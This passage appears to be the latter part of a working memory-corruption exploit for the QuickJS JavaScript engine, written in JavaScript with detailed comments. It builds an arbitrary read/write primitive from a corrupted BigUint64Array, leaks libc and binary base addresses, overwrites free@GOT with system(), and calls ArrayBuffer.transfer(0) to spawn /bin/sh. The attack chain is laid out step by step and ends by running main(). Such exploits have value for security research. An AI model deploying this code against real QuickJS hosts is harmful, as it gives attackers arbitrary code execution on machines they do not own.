   *   - victim[1] reads/writes at ptr64 + 8
   *   - etc.
   */
  Atomics.store(trigger_ta, 7, evil);

  if (barrier.byteLength === 0xbeef) std.puts('w');

  /**
   * Return the corrupted TypedArray.
   *
   * This BigUint64Array thinks its data is at ptr64.
   * Reading victim[0] reads 8 bytes from ptr64.
   * Writing victim[0] = X writes X to ptr64.
   *
   * We have achieved ARBITRARY READ/WRITE!
   */
  return victim;
}


// ============================================================================
// HELPER: Create ArrayBuffer containing a command string
// ============================================================================

/**
 * make_cmd_arraybuffer() - Create an ArrayBuffer containing a null-terminated command
 *
 * When we hijack free@GOT → system, any free(ptr) becomes system(ptr).
 * The ptr must point to a valid command string.
 *
 * We create an ArrayBuffer with "/bin/sh\0" as its data.
 * When this buffer is freed (via transfer), system("/bin/sh") is called.
 *
 * @param {string} cmd - The command to store (e.g., "/bin/sh")
 * @returns {ArrayBuffer} - Buffer with cmd as null-terminated bytes
 */
function make_cmd_arraybuffer(cmd) {
  let ab = new ArrayBuffer(cmd.length + 1);
  let u8 = new Uint8Array(ab);

  // Copy each character as a byte
  for (let i = 0; i < cmd.length; i++) {
    u8[i] = cmd.charCodeAt(i);
  }

  // Null terminator (required by C strings)
  u8[cmd.length] = 0;

  return ab;
}


// ============================================================================
// MAIN EXPLOIT
// ============================================================================

/**
 * main() - Execute the complete exploit chain
 *
 * EXPLOITATION FLOW:
 * 1. Leak libc base address (via unsorted bin fd pointer)
 * 2. Leak QuickJS PIE base address (via JSArrayBuffer.free_func)
 * 3. Calculate target addresses:
 *    - system() in libc
 *    - free@GOT in QuickJS
 * 4. Create corrupted TypedArray pointing to free@GOT
 * 5. Overwrite free@GOT with system() address
 * 6. Create ArrayBuffer containing "/bin/sh\0"
 * 7. Call transfer(0) to trigger free(data):
 *    - ArrayBuffer.transfer(0) detaches the buffer
 *    - JS_DetachArrayBuffer calls free_func(rt, opaque, data)
 *    - free_func calls js_free_rt → js_def_free → free(data)
 *    - But free@GOT = system, so free(data) = system(data) = system("/bin/sh")
 * 8. Shell spawned!
 */
function main() {
  /**
   * STAGE 1: Leak libc base address
   *
   * Uses UAF to read unsorted bin fd pointer from freed large chunk.
   */
  let libc_base = leak_libc_base();

  /**
   * STAGE 2: Leak QuickJS binary base address
   *
   * Uses UAF to read JSArrayBuffer.free_func from overlapped chunk.
   */
  let qjs_base = leak_qjs_base();

  /**
   * Calculate target addresses.
   *
   * Now that we know libc_base and qjs_base, we can compute:
   * - system_addr: address of system() in libc
   * - free_got: address of free@GOT in QuickJS binary
   */
  let system_addr = libc_base + SYSTEM_OFF;
  let free_got = qjs_base + FREE_GOT_OFF;

  /**
   * STAGE 3: Create arbitrary write primitive
   *
   * got_writer is a BigUint64Array whose internal data pointer
   * has been corrupted to point to free@GOT.
   *
   * got_writer[0] accesses the memory at free_got.
   */
  let got_writer = make_corrupted_biguint64array(free_got);

  /**
   * STAGE 4: Overwrite free@GOT with system()
   *
   * Before: free@GOT = address of free() in libc
   * After:  free@GOT = address of system() in libc
   *
   * Any subsequent call to free(ptr) will actually call system(ptr)!
   *
   * WHY THIS WORKS (Partial RELRO):
   * - With partial RELRO, the .got.plt section is writable
   * - Full RELRO would make it read-only after relocation
   * - Most binaries use partial RELRO by default
   */
  got_writer[0] = system_addr;

  /**
   * STAGE 5: Trigger free("/bin/sh") → system("/bin/sh") → shell!
   *
   * Create an ArrayBuffer whose data contains "/bin/sh\0".
   */
  let cmdab = make_cmd_arraybuffer('/bin/sh');

  /**
   * Call transfer(0) to trigger the hijacked free.
   *
   * EXECUTION CHAIN:
   * 1. cmdab.transfer(0) → js_array_buffer_transfer() (quickjs.c:56071)
   * 2. new_len = 0, so calls JS_DetachArrayBuffer() (line 56103)
   * 3. JS_DetachArrayBuffer calls:
   *      abuf->free_func(ctx->rt, abuf->opaque, abuf->data)  (line 56024)
   * 4. free_func = js_array_buffer_free, so calls:
   *      js_array_buffer_free(rt, opaque, cmdab->data)  (quickjs.c:55768)
   * 5. js_array_buffer_free calls:
   *      js_free_rt(rt, cmdab->data)  (quickjs.c:1384)
   * 6. js_free_rt calls:
   *      rt->mf.js_free(&rt->malloc_state, cmdab->data)  (quickjs.c:1386)
   * 7. js_def_free calls:
   *      free(cmdab->data)  (quickjs.c:1760)
   * 8. But free@GOT = system, so this becomes:
   *      system(cmdab->data)
   * 9. cmdab->data = "/bin/sh\0", so:
   *      system("/bin/sh")
   * 10. SHELL SPAWNED!
   */
  cmdab.transfer(0);

  /**
   * Keep the process alive while the shell runs.
   *
   * The shell reads commands from stdin. If the QuickJS process exits,
   * the shell's stdin would be closed. This infinite loop keeps the
   * process running until the shell exits.
   */
  while (true) {}
}

// Execute the exploit
main();
